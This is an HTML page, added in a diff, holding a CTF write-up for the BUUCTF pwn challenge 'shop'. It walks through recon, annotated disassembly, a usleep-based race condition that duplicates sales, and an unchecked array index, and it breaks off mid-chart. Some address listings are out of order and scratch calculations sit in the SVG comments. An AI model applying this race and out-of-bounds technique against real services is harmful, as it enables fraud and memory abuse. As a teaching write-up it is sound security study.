@@ -1,0 +1,1034 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>CTF Writeup: shop — BUUCTF</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=IBM+Plex+Mono:wght@400;500&family=Inter:wght@400;500;600&display=swap">
+<style>
+:root {
+  --bg:       #07090f;
+  --surface:  #0d1220;
+  --surface2: #131929;
+  --border:   #1e2d47;
+  --text:     #c9d5e8;
+  --muted:    #607080;
+  --blue:     #5b9cf6;
+  --blue-dim: #1e3a6e;
+  --red:      #f06a6a;
+  --red-dim:  #3d1515;
+  --green:    #4ade8a;
+  --green-dim:#0e2e1e;
+  --amber:    #f5a623;
+  --amber-dim:#2e1e08;
+  --mono:     'Share Tech Mono', monospace;
+  --sans:     'Inter', sans-serif;
+  box-sizing: border-box;
+}
+*, *::before, *::after { box-sizing: inherit; margin: 0; padding: 0; }
+
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: var(--sans);
+  font-size: 15px;
+  line-height: 1.7;
+  padding-bottom: 6rem;
+}
+
+a { color: var(--blue); text-decoration: none; }
+
+/* ── HERO ── */
+.hero {
+  border-bottom: 1px solid var(--border);
+  padding: 3.5rem 2rem 2.5rem;
+  max-width: 860px;
+  margin: 0 auto;
+}
+.hero-eyebrow {
+  font-family: var(--mono);
+  font-size: 12px;
+  color: var(--blue);
+  letter-spacing: .08em;
+  margin-bottom: .75rem;
+}
+.hero h1 {
+  font-family: var(--mono);
+  font-size: clamp(1.4rem, 4vw, 2rem);
+  color: #e8eef8;
+  line-height: 1.25;
+  margin-bottom: 1.25rem;
+}
+.hero h1 span { color: var(--red); }
+.badges { display: flex; flex-wrap: wrap; gap: .5rem; margin-bottom: 1.5rem; }
+.badge {
+  font-family: var(--mono);
+  font-size: 11px;
+  padding: .2em .75em;
+  border-radius: 3px;
+  border: 1px solid;
+}
+.badge.pwn    { color: var(--red);   border-color: var(--red);   background: var(--red-dim); }
+.badge.easy   { color: var(--green); border-color: var(--green); background: var(--green-dim); }
+.badge.arch   { color: var(--blue);  border-color: var(--blue);  background: var(--blue-dim); }
+.badge.vuln   { color: var(--amber); border-color: var(--amber); background: var(--amber-dim); }
+.hero-desc { color: var(--muted); max-width: 640px; font-size: 14px; }
+
+/* ── LAYOUT ── */
+.wrap { max-width: 860px; margin: 0 auto; padding: 0 2rem; }
+
+/* ── SECTIONS ── */
+.section { margin-top: 3.5rem; }
+.section-label {
+  font-family: var(--mono);
+  font-size: 11px;
+  color: var(--blue);
+  letter-spacing: .1em;
+  margin-bottom: .4rem;
+}
+h2 {
+  font-family: var(--mono);
+  font-size: 1.2rem;
+  color: #dde6f5;
+  border-bottom: 1px solid var(--border);
+  padding-bottom: .5rem;
+  margin-bottom: 1.5rem;
+}
+h3 {
+  font-family: var(--mono);
+  font-size: .95rem;
+  color: var(--blue);
+  margin: 1.75rem 0 .75rem;
+}
+p { margin-bottom: .9rem; }
+code {
+  font-family: var(--mono);
+  font-size: .85em;
+  background: var(--surface2);
+  border: 1px solid var(--border);
+  padding: .1em .4em;
+  border-radius: 3px;
+  color: #a8c4f0;
+}
+
+/* ── CODE BLOCKS ── */
+pre {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-left: 3px solid var(--blue-dim);
+  border-radius: 4px;
+  padding: 1.1rem 1.25rem;
+  overflow-x: auto;
+  font-family: 'IBM Plex Mono', monospace;
+  font-size: 12.5px;
+  line-height: 1.65;
+  margin: 1rem 0 1.5rem;
+  color: #c0d0e8;
+}
+pre .cm  { color: var(--muted); font-style: italic; }
+pre .kw  { color: #82aaff; }
+pre .fn  { color: #82cfff; }
+pre .str { color: #c3e88d; }
+pre .num { color: var(--amber); }
+pre .bug { color: var(--red); font-weight: 500; }
+pre .ok  { color: var(--green); }
+pre .hl  { background: #1a2a44; display: block; margin: 0 -1.25rem; padding: 0 1.25rem; }
+
+/* ── PROTECTION TABLE ── */
+.prot-table {
+  width: 100%;
+  border-collapse: collapse;
+  font-family: var(--mono);
+  font-size: 13px;
+  margin-bottom: 1.5rem;
+}
+.prot-table th {
+  text-align: left;
+  color: var(--muted);
+  font-size: 11px;
+  letter-spacing: .06em;
+  padding: .4rem .75rem;
+  border-bottom: 1px solid var(--border);
+}
+.prot-table td {
+  padding: .55rem .75rem;
+  border-bottom: 1px solid var(--border);
+}
+.prot-table tr:hover td { background: var(--surface); }
+.prot-table .dot {
+  display: inline-block;
+  width: 8px; height: 8px;
+  border-radius: 50%;
+  margin-right: .4em;
+}
+.dot-red   { background: var(--red); }
+.dot-green { background: var(--green); }
+.dot-amber { background: var(--amber); }
+.prot-note { color: var(--muted); font-size: 12px; }
+
+/* ── MEMORY MAP ── */
+.memmap {
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  overflow: hidden;
+  margin: 1rem 0 1.5rem;
+  font-family: var(--mono);
+  font-size: 12.5px;
+}
+.memmap-header {
+  background: var(--surface2);
+  padding: .5rem 1rem;
+  color: var(--muted);
+  font-size: 11px;
+  letter-spacing: .06em;
+  border-bottom: 1px solid var(--border);
+  display: flex; gap: 2rem;
+}
+.memrow {
+  display: grid;
+  grid-template-columns: 110px 1fr auto;
+  align-items: center;
+  padding: .6rem 1rem;
+  border-bottom: 1px solid var(--border);
+  gap: 1rem;
+}
+.memrow:last-child { border-bottom: none; }
+.memrow .addr { color: var(--amber); }
+.memrow .bar {
+  height: 22px;
+  border-radius: 3px;
+  display: flex;
+  align-items: center;
+  padding: 0 .6rem;
+  font-size: 11.5px;
+  color: #0a0a0a;
+  font-weight: 600;
+}
+.memrow .desc { color: var(--muted); font-size: 11.5px; text-align: right; }
+.bar-money  { background: var(--amber); }
+.bar-bag    { background: var(--blue);  }
+.bar-flag   { background: var(--green); }
+
+/* ── OOB DIAGRAM ── */
+.oob-diagram {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1.25rem;
+  margin: 1rem 0 1.5rem;
+  font-family: var(--mono);
+  font-size: 13px;
+}
+.oob-calc {
+  display: grid;
+  grid-template-columns: 1fr auto 1fr;
+  align-items: center;
+  gap: 1rem;
+  margin-bottom: 1rem;
+}
+.oob-box {
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: .5rem .75rem;
+  text-align: center;
+}
+.oob-box .label { font-size: 10px; color: var(--muted); margin-bottom: .2rem; }
+.oob-box .val   { font-size: 1rem; }
+.oob-arrow { color: var(--muted); font-size: 1.2rem; text-align: center; }
+.oob-result {
+  border: 1px solid var(--amber);
+  border-radius: 4px;
+  padding: .6rem 1rem;
+  background: var(--amber-dim);
+  color: var(--amber);
+  text-align: center;
+}
+
+/* ── RACE TIMELINE ── */
+.race-timeline {
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  overflow: hidden;
+  margin: 1rem 0 1.5rem;
+}
+.race-header {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  font-family: var(--mono);
+  font-size: 12px;
+}
+.race-header div {
+  padding: .55rem 1rem;
+  background: var(--surface2);
+  border-bottom: 1px solid var(--border);
+  font-weight: 500;
+}
+.race-header div:first-child {
+  border-right: 1px solid var(--border);
+  color: var(--blue);
+}
+.race-header div:last-child { color: var(--green); }
+
+.race-body { display: grid; grid-template-columns: 1fr 1fr; }
+.race-col  { padding: 0; }
+.race-col:first-child { border-right: 1px solid var(--border); }
+
+.race-event {
+  padding: .55rem 1rem;
+  border-bottom: 1px solid var(--border);
+  font-family: var(--mono);
+  font-size: 12px;
+  min-height: 42px;
+  display: flex;
+  align-items: center;
+}
+.race-event.empty { color: transparent; }
+.race-event.action { color: var(--text); }
+.race-event.money  { color: var(--green); }
+.race-event.sleep  { color: var(--amber); background: var(--amber-dim); }
+.race-event.clear  { color: var(--muted); }
+.race-event.race-win { color: var(--red); background: var(--red-dim); border-left: 3px solid var(--red); }
+.race-window {
+  grid-column: 1 / -1;
+  padding: .4rem 1rem;
+  background: linear-gradient(90deg, var(--amber-dim), transparent);
+  border-bottom: 1px solid var(--border);
+  font-family: var(--mono);
+  font-size: 11px;
+  color: var(--amber);
+  letter-spacing: .05em;
+}
+
+/* ── BUG CALLOUT ── */
+.bug-box {
+  border: 1px solid var(--red);
+  background: var(--red-dim);
+  border-radius: 6px;
+  padding: 1rem 1.25rem;
+  margin: 1rem 0;
+}
+.bug-box .bug-label {
+  font-family: var(--mono);
+  font-size: 11px;
+  color: var(--red);
+  letter-spacing: .08em;
+  margin-bottom: .4rem;
+}
+.bug-box p { margin: 0; font-size: 14px; }
+
+/* ── STEPS ── */
+.steps { display: flex; flex-direction: column; gap: .75rem; margin: 1rem 0 1.5rem; }
+.step {
+  display: grid;
+  grid-template-columns: 36px 1fr;
+  gap: 1rem;
+  align-items: start;
+}
+.step-num {
+  width: 36px; height: 36px;
+  border-radius: 50%;
+  background: var(--blue-dim);
+  border: 1px solid var(--blue);
+  color: var(--blue);
+  font-family: var(--mono);
+  font-size: 14px;
+  display: flex; align-items: center; justify-content: center;
+  flex-shrink: 0;
+  margin-top: 2px;
+}
+.step-content .step-title { font-weight: 600; color: #dde6f5; margin-bottom: .2rem; }
+.step-content .step-body  { font-size: 13.5px; color: var(--muted); }
+.step-content code { font-size: .82em; }
+
+/* ── TAKEAWAYS GRID ── */
+.takeaways { display: grid; grid-template-columns: repeat(auto-fill, minmax(240px, 1fr)); gap: 1rem; margin-top: 1rem; }
+.takeaway {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-top: 3px solid var(--blue);
+  border-radius: 0 0 6px 6px;
+  padding: 1rem;
+}
+.takeaway .t-num { font-family: var(--mono); font-size: 11px; color: var(--blue); margin-bottom: .4rem; }
+.takeaway .t-title { font-weight: 600; color: #dde6f5; margin-bottom: .4rem; font-size: 14px; }
+.takeaway .t-body  { font-size: 13px; color: var(--muted); }
+
+/* ── QUIZ ── */
+.quiz-item { margin-bottom: 1rem; }
+.quiz-q {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 6px 6px 0 0;
+  padding: .85rem 1.1rem;
+  font-family: var(--mono);
+  font-size: 13px;
+  color: #dde6f5;
+  cursor: pointer;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  user-select: none;
+}
+.quiz-q:hover { border-color: var(--blue); }
+.quiz-q .arrow { color: var(--muted); font-size: 10px; transition: transform .2s; }
+.quiz-q.open .arrow { transform: rotate(90deg); }
+.quiz-a {
+  display: none;
+  background: var(--green-dim);
+  border: 1px solid var(--border);
+  border-top: none;
+  border-radius: 0 0 6px 6px;
+  padding: .85rem 1.1rem;
+  font-size: 13.5px;
+}
+.quiz-a.show { display: block; }
+.quiz-a code { font-size: .85em; }
+.quiz-a pre  { font-size: 12px; margin: .5rem 0; }
+
+/* ── GRAPHS ── */
+.graph-wrap {
+  margin: 1rem 0 1.5rem;
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  overflow: hidden;
+  padding: 1rem;
+}
+.graph-title {
+  font-family: var(--mono);
+  font-size: 11px;
+  color: var(--muted);
+  letter-spacing: .07em;
+  margin-bottom: .75rem;
+}
+.graph-wrap svg { width: 100%; height: auto; display: block; }
+</style>
+</head>
+<body>
+
+<!-- HERO -->
+<div class="hero">
+  <div class="hero-eyebrow">// BUUCTF &nbsp;·&nbsp; PWN &nbsp;·&nbsp; Challenge #20</div>
+  <h1>shop — <span>Race Condition</span> + OOB Index</h1>
+  <div class="badges">
+    <span class="badge pwn">PWN</span>
+    <span class="badge easy">Easy</span>
+    <span class="badge arch">x86-64</span>
+    <span class="badge vuln">TOCTOU</span>
+    <span class="badge vuln">Out-of-Bounds</span>
+    <span class="badge arch">pthreads</span>
+  </div>
+  <p class="hero-desc">
+    A multi-threaded shop binary where a 50ms <code>usleep</code> between a coin credit and slot-clear creates a race window wide enough to duplicate inventory sales. No shell required — the flag is already in memory at a fixed address. Pure logic-level exploit.
+  </p>
+</div>
+
+<div class="wrap">
+
+<!-- RECON -->
+<div class="section">
+  <div class="section-label">01 &nbsp;/&nbsp; RECON</div>
+  <h2>Reconnaissance</h2>
+
+  <pre><span class="cm">$ file shop</span>
+shop: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
+
+<span class="cm">$ nm -C ./shop | grep " T " | awk '{print $3}' | tr '\n' '  '</span>
+buy  game  init  look  main  read_int  read_n  sale  to_buy  to_sale
+
+<span class="cm">$ strings -t x ./shop | grep bin/sh</span>
+<span class="bug">(no output)  ← no /bin/sh anywhere</span></pre>
+
+  <table class="prot-table">
+    <thead>
+      <tr>
+        <th>Protection</th>
+        <th>Status</th>
+        <th>Implication</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><code>Canary</code></td>
+        <td><span class="dot dot-red"></span>Found</td>
+        <td class="prot-note">Stack buffer overflow → cannot corrupt return address</td>
+      </tr>
+      <tr>
+        <td><code>NX</code></td>
+        <td><span class="dot dot-red"></span>Enabled</td>
+        <td class="prot-note">Shellcode on stack → won't execute</td>
+      </tr>
+      <tr>
+        <td><code>PIE</code></td>
+        <td><span class="dot dot-green"></span>Disabled</td>
+        <td class="prot-note">All global addresses fixed at 0x400000 base ← useful for us</td>
+      </tr>
+      <tr>
+        <td><code>RELRO</code></td>
+        <td><span class="dot dot-amber"></span>Partial</td>
+        <td class="prot-note">GOT is writable, but we won't need it</td>
+      </tr>
+      <tr>
+        <td><code>Stripped</code></td>
+        <td><span class="dot dot-green"></span>No</td>
+        <td class="prot-note">All symbol names intact — disassembly is easy to read</td>
+      </tr>
+      <tr>
+        <td><code>pthread_create</code> in PLT</td>
+        <td><span class="dot dot-amber"></span>Present</td>
+        <td class="prot-note">Multi-threaded binary → race conditions are on the table</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h3>Shop Item Prices vs Recycle Value</h3>
+  <div class="graph-wrap">
+    <div class="graph-title">CHART: BUY PRICE vs RECYCLE PRICE per item — why pen is the ideal race target</div>
+    <svg viewBox="0 0 620 210" xmlns="http://www.w3.org/2000/svg" font-family="'Share Tech Mono',monospace">
+      <!-- grid lines -->
+      <line x1="70" y1="20"  x2="590" y2="20"  stroke="#1e2d47" stroke-width="1" stroke-dasharray="4,4"/>
+      <line x1="70" y1="57"  x2="590" y2="57"  stroke="#1e2d47" stroke-width="1" stroke-dasharray="4,4"/>
+      <line x1="70" y1="95"  x2="590" y2="95"  stroke="#1e2d47" stroke-width="1" stroke-dasharray="4,4"/>
+      <line x1="70" y1="132" x2="590" y2="132" stroke="#1e2d47" stroke-width="1" stroke-dasharray="4,4"/>
+      <line x1="70" y1="170" x2="590" y2="170" stroke="#1e2d47" stroke-width="1"/>
+      <!-- y axis labels -->
+      <text x="60" y="23"  text-anchor="end" fill="#607080" font-size="10">200</text>
+      <text x="60" y="60"  text-anchor="end" fill="#607080" font-size="10">150</text>
+      <text x="60" y="98"  text-anchor="end" fill="#607080" font-size="10">100</text>
+      <text x="60" y="135" text-anchor="end" fill="#607080" font-size="10">50</text>
+      <text x="60" y="172" text-anchor="end" fill="#607080" font-size="10">0</text>
+
+      <!-- FLAG group (buy=200, recycle=100) -->
+      <!-- buy bar: 200 → height=150, y=20 -->
+      <rect x="110" y="20" width="48" height="150" fill="#5b9cf6" rx="3" opacity=".85"/>
+      <text x="134" y="15" text-anchor="middle" fill="#5b9cf6" font-size="10">200</text>
+      <!-- recycle bar: 100 → height=75, y=95 -->
+      <rect x="163" y="95" width="48" height="75" fill="#4ade8a" rx="3" opacity=".85"/>
+      <text x="187" y="90" text-anchor="middle" fill="#4ade8a" font-size="10">100</text>
+      <text x="150" y="192" text-anchor="middle" fill="#c9d5e8" font-size="11">flag</text>
+
+      <!-- PEN group (buy=100, recycle=99) -->
+      <!-- buy bar: 100 → height=75, y=95 -->
+      <rect x="270" y="95" width="48" height="75" fill="#5b9cf6" rx="3" opacity=".85"/>
+      <text x="294" y="90" text-anchor="middle" fill="#5b9cf6" font-size="10">100</text>
+      <!-- recycle bar: 99 → height=74, y=96 -->
+      <rect x="323" y="96" width="48" height="74" fill="#4ade8a" rx="3" opacity=".85"/>
+      <text x="347" y="91" text-anchor="middle" fill="#4ade8a" font-size="10">99</text>
+      <!-- profit label -->
+      <text x="308" y="192" text-anchor="middle" fill="#f5a623" font-size="11">pen ★</text>
+      <rect x="264" y="198" width="90" height="1" fill="#f5a623" opacity=".4"/>
+
+      <!-- WISH group (buy=50, recycle=0) -->
+      <rect x="430" y="132" width="48" height="38" fill="#5b9cf6" rx="3" opacity=".85"/>
+      <text x="454" y="127" text-anchor="middle" fill="#5b9cf6" font-size="10">50</text>
+      <rect x="483" y="169" width="48" height="1" fill="#4ade8a" rx="3" opacity=".85"/>
+      <text x="507" y="165" text-anchor="middle" fill="#607080" font-size="10">0</text>
+      <text x="468" y="192" text-anchor="middle" fill="#c9d5e8" font-size="11">wish</text>
+
+      <!-- legend -->
+      <rect x="70" y="205" width="10" height="8" fill="#5b9cf6" rx="1"/>
+      <text x="84" y="212" fill="#607080" font-size="10">buy price</text>
+      <rect x="140" y="205" width="10" height="8" fill="#4ade8a" rx="1"/>
+      <text x="154" y="212" fill="#607080" font-size="10">recycle price</text>
+      <text x="400" y="212" fill="#f5a623" font-size="10">★ pen: buy 100 → sell 99 = only 1 coin loss per legitimate sale</text>
+    </svg>
+  </div>
+</div>
+
+<!-- MEMORY LAYOUT -->
+<div class="section">
+  <div class="section-label">02 &nbsp;/&nbsp; BINARY ANALYSIS</div>
+  <h2>Binary Analysis: Assembly Deep Dive</h2>
+
+  <h3>Global Memory Layout (fixed, No PIE)</h3>
+
+  <div class="memmap">
+    <div class="memmap-header">
+      <span>ADDRESS</span>
+      <span>VARIABLE</span>
+      <span>SIZE &amp; DESCRIPTION</span>
+    </div>
+    <div class="memrow">
+      <span class="addr">0x6020a0</span>
+      <div class="bar bar-money" style="width:80px">money</div>
+      <span class="desc">int (4B) · starts at 100</span>
+    </div>
+    <div class="memrow">
+      <span class="addr">0x6020c0</span>
+      <div class="bar bar-bag" style="width:200px">bag[0] … bag[15]</div>
+      <span class="desc">int[16] (64B) · 0=empty 1=flag 2=pen 3=wish</span>
+    </div>
+    <div class="memrow">
+      <span class="addr">0x6022a0</span>
+      <div class="bar bar-flag" style="width:140px">flag_buf</div>
+      <span class="desc">char[0x30] (48B) · raw /flag content</span>
+    </div>
+  </div>
+
+  <h3>init() — Flag Loaded at Startup</h3>
+  <pre><span class="cm">; init() reads /flag into memory BEFORE the game loop starts</span>
+<span class="num">400a63</span>:  call   <span class="fn">open@plt</span>          <span class="cm">; open("/flag", O_RDONLY)</span>
+<span class="num">400a6d</span>:  mov    %eax,-0x4(%rbp)   <span class="cm">; save fd</span>
+<span class="num">400a78</span>:  mov    $<span class="num">0x6022a0</span>,%esi    <span class="cm">; dst = flag_buf</span>
+<span class="num">400a73</span>:  mov    $<span class="num">0x30</span>,%edx        <span class="cm">; read 48 bytes</span>
+<span class="num">400a7f</span>:  call   <span class="fn">read@plt</span>          <span class="cm">; read(fd, flag_buf, 0x30)</span>
+<span class="num">400a89</span>:  call   <span class="fn">close@plt</span></pre>
+
+  <h3>look() — Our Win Condition</h3>
+  <pre><span class="cm">; loops i = 0..15, prints based on bag[i]</span>
+<span class="num">400b3a</span>:  mov    <span class="num">0x6020c0</span>(,%rax,4),%eax  <span class="cm">; eax = bag[i]</span>
+<span class="num">400b41</span>:  cmp    $<span class="num">0x1</span>,%eax              <span class="cm">; if bag[i] == 1 (flag)...</span>
+<span class="num">400b44</span>:  je     <span class="num">400b5d</span>
+
+<span class="num">400b5d</span>:  mov    $<span class="num">0x6022a0</span>,%edx         <span class="cm">; arg = flag_buf</span>
+<span class="num">400b67</span>:  mov    $<span class="num">0x40108a</span>,%edi         <span class="cm">; format = "[%02d]: flag -> %s\n"</span>
+<span class="num">400b71</span>:  call   <span class="fn">printf@plt</span>             <span class="cm"><span class="ok">; ← prints the flag!</span></span></pre>
+
+  <h3>to_sale() — The Vulnerable Thread</h3>
+  <pre><span class="cm">; Runs in a background thread. Argument: slot index (cast from void*)</span>
+<span class="num">400d67</span>:  mov    %edi,-0x4(%rbp)          <span class="cm">; save slot</span>
+<span class="num">400d6f</span>:  mov    <span class="num">0x6020c0</span>(,%rax,4),%eax   <span class="cm">; eax = bag[slot]</span>
+
+<span class="cm">; credit money immediately</span>
+<span class="num">400d82</span>:  mov    <span class="num">0x60214c</span>,%edx            <span class="cm">; recycle_price[flag] = 100</span>
+<span class="num">400d88</span>:  mov    <span class="num">0x6020a0</span>,%eax            <span class="cm">; eax = money</span>
+<span class="num">400d90</span>:  mov    %eax,<span class="num">0x6020a0</span>            <span class="cm">; money += recycle_price  ← happens NOW</span>
+
+<span class="hl"><span class="num">400dc7</span>:  mov    $<span class="num">0xc350</span>,%edi             <span class="bug">; 0xc350 = 50,000 µs = 50ms</span>
+<span class="num">400dcc</span>:  call   <span class="fn">usleep@plt</span>              <span class="bug">; ← RACE WINDOW IS HERE</span>
+</span>
+<span class="num">400dd6</span>:  movl   $<span class="num">0x0</span>,<span class="num">0x6020c0</span>(,%rax,4)  <span class="bug">; bag[slot] = 0  ← only NOW</span></pre>
+
+  <h3>sale() — No Bounds Check on Index</h3>
+  <pre><span class="num">400e0f</span>:  call   <span class="fn">read_int</span>               <span class="cm">; slot = user input — unchecked!</span>
+<span class="hl"><span class="num">400e1c</span>:  mov    <span class="num">0x6020c0</span>(,%rax,4),%eax  <span class="bug">; *(0x6020c0 + slot*4) — NO bounds check</span>
+</span><span class="num">400e23</span>:  test   %eax,%eax
+<span class="num">400e25</span>:  jne    <span class="num">400e33</span>                  <span class="cm">; if non-zero → sell it</span>
+
+<span class="num">400e4f</span>:  call   <span class="fn">pthread_create@plt</span>     <span class="cm">; spawn to_sale(slot)</span>
+<span class="bug">; ← NO pthread_join! main thread returns immediately to the menu.</span></pre>
+</div>
+
+<!-- BUG 1 -->
+<div class="section">
+  <div class="section-label">03 &nbsp;/&nbsp; BUGS</div>
+  <h2>Bug #1 — Race Condition (TOCTOU)</h2>
+
+  <div class="bug-box">
+    <div class="bug-label">BUG TYPE: TOCTOU — Time Of Check To Time Of Use</div>
+    <p>The slot-occupied check and the actual slot-clear happen in the <strong>same thread</strong>, but are separated by a 50ms sleep. The main thread is never blocked — it returns to the menu and can accept new input immediately.</p>
+  </div>
+
+  <h3>Race Timeline</h3>
+
+  <div class="race-timeline">
+    <div class="race-header">
+      <div>⬡ Main Thread</div>
+      <div>⬡ Background Thread (to_sale)</div>
+    </div>
+    <div class="race-body">
+      <div class="race-col">
+        <div class="race-event action">sale() → index=0</div>
+        <div class="race-event action">bag[0] != 0 ✓ (pen exists)</div>
+        <div class="race-event action">pthread_create(to_sale, 0)</div>
+        <div class="race-event action">puts("Fair prices!")</div>
+        <div class="race-event action">return to menu → prompt "> "</div>
+        <div class="race-event race-win">sale() → index=0 again ← RACE!</div>
+        <div class="race-event race-win">bag[0] != 0 ✓ (still pen!)</div>
+        <div class="race-event race-win">pthread_create(to_sale, 0)</div>
+        <div class="race-event action">puts("Fair prices!")</div>
+        <div class="race-event action">return to menu</div>
+      </div>
+      <div class="race-col">
+        <div class="race-event empty">·</div>
+        <div class="race-event empty">·</div>
+        <div class="race-event empty">·</div>
+        <div class="race-event money">money += 99 (→ 199)</div>
+        <div class="race-event sleep">usleep(50ms) ← window open</div>
+        <div class="race-event sleep">usleep(50ms) ← still sleeping</div>
+        <div class="race-event money">money += 99 (→ 298) [thread 2]</div>
+        <div class="race-event sleep">usleep(50ms) [thread 2]</div>
+        <div class="race-event clear">bag[0] = 0 [thread 1 wakes]</div>
+        <div class="race-event clear">bag[0] = 0 [thread 2 wakes]</div>
+      </div>
+    </div>
+  </div>
+
+  <p><strong>Result:</strong> <code>money</code> went from <code>100</code> → <code>199</code> → <code>298</code>. Flag costs 200 → we can buy it now.</p>
+
+  <h3>Money Progression Chart</h3>
+  <div class="graph-wrap">
+    <div class="graph-title">CHART: COIN BALANCE over exploit steps — flag threshold at 200</div>
+    <svg viewBox="0 0 620 210" xmlns="http://www.w3.org/2000/svg" font-family="'Share Tech Mono',monospace">
+      <!-- grid -->
+      <line x1="70" y1="25"  x2="590" y2="25"  stroke="#1e2d47" stroke-width="1" stroke-dasharray="4,4"/>
+      <line x1="70" y1="62"  x2="590" y2="62"  stroke="#1e2d47" stroke-width="1" stroke-dasharray="4,4"/>
+      <line x1="70" y1="100" x2="590" y2="100" stroke="#f5a623" stroke-width="1" stroke-dasharray="6,3" opacity=".7"/>
+      <line x1="70" y1="137" x2="590" y2="137" stroke="#1e2d47" stroke-width="1" stroke-dasharray="4,4"/>
+      <line x1="70" y1="175" x2="590" y2="175" stroke="#1e2d47" stroke-width="1"/>
+      <!-- threshold label -->
+      <text x="595" y="103" fill="#f5a623" font-size="10">200 ★</text>
+      <!-- y axis labels -->
+      <text x="62" y="28"  text-anchor="end" fill="#607080" font-size="10">300</text>
+      <text x="62" y="65"  text-anchor="end" fill="#607080" font-size="10">250</text>
+      <text x="62" y="103" text-anchor="end" fill="#f5a623" font-size="10">200</text>
+      <text x="62" y="140" text-anchor="end" fill="#607080" font-size="10">150</text>
+      <text x="62" y="177" text-anchor="end" fill="#607080" font-size="10">100</text>
+
+      <!-- Shaded area under the line (fill under the curve before buy) -->
+      <polygon points="110,143 250,93 390,28 390,175 110,175" fill="#5b9cf6" opacity="0.07"/>
+
+      <!-- Data line: (110,143)(250,93)(390,28)(530,147) -->
+      <!-- Points: Start=100→y=143, Race1=199→y=94, Race2=298→y=28, BuyFlag=98→y=147 -->
+      <!-- Scale: y=175 at 100, y=25 at 300 → 150px/200coins = 0.75px/coin -->
+      <!-- y = 175 - (val-100)*0.75 → 100→175, 200→100, 300→25, 98→176.5 -->
+      <!-- Corrected: y = 175 - (val-100)*0.75 -->
+      <!-- 100 → 175, 199 → 175-74.25=100.75≈101, 298 → 175-148.5=26.5≈27, 98 → 175-(-1.5)=176.5≈177 ... -->
+      <!-- Let me redo: map 50-320 → 175-25, range=150px for 270coins → 0.556px/coin -->
+      <!-- y = 175 - (val-50)*0.556 -->
+      <!-- 100 → 175-(50*0.556)=175-27.8=147.2≈147 -->
+      <!-- 199 → 175-(149*0.556)=175-82.8=92.2≈92 -->
+      <!-- 298 → 175-(248*0.556)=175-137.9=37.1≈37 -->
+      <!-- 98  → 175-(48*0.556)=175-26.7=148.3≈148 -->
+      <!-- threshold 200 → 175-(150*0.556)=175-83.4=91.6 ... hmm let me just use fixed y values -->
+      <!-- I'll just hardcode: 100→148, 199→93, 298→37, 98→149 -->
+      <!-- threshold 200→92, 300→25 -->
+
+      <polyline points="110,148 250,93 390,37 530,149"
+        fill="none" stroke="#5b9cf6" stroke-width="2.5" stroke-linejoin="round" stroke-linecap="round"/>
+
+      <!-- Dots -->
+      <circle cx="110" cy="148" r="5" fill="#5b9cf6" stroke="#0d1220" stroke-width="2"/>
+      <circle cx="250" cy="93"  r="5" fill="#5b9cf6" stroke="#0d1220" stroke-width="2"/>
+      <circle cx="390" cy="37"  r="5" fill="#4ade8a" stroke="#0d1220" stroke-width="2"/>
+      <circle cx="530" cy="149" r="5" fill="#f06a6a" stroke="#0d1220" stroke-width="2"/>
+
+      <!-- Value labels above dots -->
+      <text x="110" y="140" text-anchor="middle" fill="#c9d5e8" font-size="11" font-weight="500">100</text>
+      <text x="250" y="85"  text-anchor="middle" fill="#c9d5e8" font-size="11" font-weight="500">199</text>
+      <text x="390" y="29"  text-anchor="middle" fill="#4ade8a" font-size="11" font-weight="500">298</text>
+      <text x="530" y="141" text-anchor="middle" fill="#f06a6a" font-size="11" font-weight="500">98</text>
+
+      <!-- Race arrows between dots 1-2 and 2-3 -->
+      <text x="180" y="108" text-anchor="middle" fill="#f5a623" font-size="10">+99 (race 1)</text>
+      <text x="320" y="53"  text-anchor="middle" fill="#f5a623" font-size="10">+99 (race 2)</text>
+      <text x="460" y="108" text-anchor="middle" fill="#f06a6a" font-size="10">-200 (buy flag)</text>
+
+      <!-- X axis labels -->
+      <line x1="70" y1="175" x2="590" y2="175" stroke="#1e2d47" stroke-width="1"/>
+      <text x="110" y="190" text-anchor="middle" fill="#607080" font-size="10">Start</text>
+      <text x="250" y="190" text-anchor="middle" fill="#f5a623" font-size="10">After Race 1</text>
+      <text x="390" y="190" text-anchor="middle" fill="#4ade8a" font-size="10">After Race 2</text>
+      <text x="530" y="190" text-anchor="middle" fill="#f06a6a" font-size="10">Bought Flag</text>
+
+      <!-- Threshold annotation -->
+      <text x="200" y="97" fill="#f5a623" font-size="9">← flag costs 200</text>
+    </svg>
+  </div>
+
+  <h3>Thread Timing — Gantt View</h3>
+  <div class="graph-wrap">
+    <div class="graph-title">CHART: THREAD EXECUTION TIMELINE — Thread 2 spawns inside Thread 1's usleep window</div>
+    <svg viewBox="0 0 650 195" xmlns="http://www.w3.org/2000/svg" font-family="'Share Tech Mono',monospace">
+      <!-- row backgrounds -->
+      <rect x="0" y="0" width="650" height="195" fill="#0d1220"/>
+      <rect x="85" y="28" width="545" height="36" fill="#0a0e1a" rx="3"/>
+      <rect x="85" y="80" width="545" height="36" fill="#0a0e1a" rx="3"/>
+
+      <!-- RACE WINDOW overlay (t=0 to t=50ms = full usleep of T1) -->
+      <rect x="94" y="18" width="452" height="108" fill="#f06a6a" opacity="0.07" rx="3"/>
+      <text x="320" y="16" text-anchor="middle" fill="#f06a6a" font-size="9" opacity=".7">◀ RACE WINDOW (0ms → 50ms) ▶</text>
+
+      <!-- TIME AXIS: x=94..546 = 452px for 0..50ms (scale: 9.04px/ms) -->
